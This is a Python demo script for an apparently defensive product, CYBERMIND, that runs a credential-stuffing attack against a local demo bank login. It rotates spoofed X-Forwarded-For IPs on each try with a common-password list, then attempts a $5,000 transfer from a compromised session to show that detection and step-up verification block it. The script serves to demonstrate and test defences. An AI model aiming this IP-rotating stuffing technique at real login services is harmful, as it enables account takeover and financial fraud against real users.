"""LIVE DEMO 1: credential stuffing against VaultApp's login, with a different IP on every try.

A per-IP rate limit sees one try per address and does nothing. CYBERMIND groups the attempts by client
fingerprint, spots the campaign and marks it BLOCKED. From then on every sign-in from that fingerprint needs
step-up: even if the attacker guesses a correct password, the session cannot move money. The script proves it
at the end. Watch the console: Detections -> Campaigns & Decoys, and the red "campaign blocked" banner.

    python demo/attack_login.py                      (backend on http://127.0.0.1:8000)
    python demo/attack_login.py --base http://127.0.0.1:8001 --tries 400

Needs the backend in development mode (ALLOW_CLIENT_IP_HEADER=true, the default in dev) so the script can
pretend to come from many addresses. It only talks to your own local demo app.
"""
import argparse
import json
import time
import urllib.error
import urllib.request
import uuid

PASSWORDS = ["123456", "password", "qwerty", "letmein", "Summer2026!", "welcome1", "iloveyou", "admin123"]
NAMES = ["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi", "ivan", "judy", "mallory", "oscar", "peggy", "trent"]
STUFFING_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0 Safari/537.36"


def post(base, path, body, ip, headers=None):
    req = urllib.request.Request(base + path, data=json.dumps(body).encode(),
                                 headers={"Content-Type": "application/json", "X-Forwarded-For": ip, "User-Agent": STUFFING_UA, **(headers or {})})
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, json.loads(r.read() or b"{}")
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b"{}")
    except urllib.error.URLError:
        return 0, {}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://127.0.0.1:8000")
    ap.add_argument("--tries", type=int, default=300)
    ap.add_argument("--pause", type=float, default=0.03, help="seconds between tries")
    a = ap.parse_args()
    b = a.base

    victim, vpass = "victim" + uuid.uuid4().hex[:6], "Leaked-Pass-2026!x"
    st, _ = post(b, "/bank/register", {"username": victim, "full_name": "Demo Victim", "password": vpass}, "82.64.12.9", {"User-Agent": "Demo-Setup/1.0"})
    print(f"Setup: customer '{victim}' exists (their password leaked in some other breach).  register -> HTTP {st}")
    print(f"\nAttack: credential stuffing against {b}/bank/login ({a.tries} tries, a new IP on every try)\n")
    for i in range(1, a.tries + 1):
        ip = f"{45 + i // 250}.{(i * 7) % 250}.{(i * 13) % 250}.{1 + i % 250}"
        status, _ = post(b, "/bank/login", {"username": f"{NAMES[i % len(NAMES)]}{i}", "password": PASSWORDS[i % len(PASSWORDS)]}, ip)
        if status == 0:
            print("  cannot reach the server")
            return
        if i % 50 == 0:
            print(f"  attempt {i:>4}: HTTP {status} (wrong password); each IP has tried only once")
        time.sleep(a.pause)

    print("\nThe attacker's list finally hits the victim's real password, from yet another IP, same tool fingerprint:")
    st, j = post(b, "/bank/login", {"username": victim, "password": vpass}, "91.200.10.77")
    if st != 200:
        print(f"  sign-in refused outright (HTTP {st}): {j.get('detail')}")
        return
    print(f"  sign-in worked (HTTP 200) but CYBERMIND flagged it: step_up_required = {j['step_up_required']}")
    st, r = post(b, "/bank/transfer", {"session_id": j["session_id"], "recipient": "Mule Account", "amount": 5000}, "91.200.10.77",
                 {"X-Session-Token": j["session_token"]})
    print(f"  attacker tries to send $5,000 -> HTTP {st}: {r.get('detail', r)}")
    print("\nConsole: Detections -> Campaigns & Decoys shows the campaign BLOCKED with its reasons; Active Sessions shows this session waiting for step-up.")


if __name__ == "__main__":
    main()
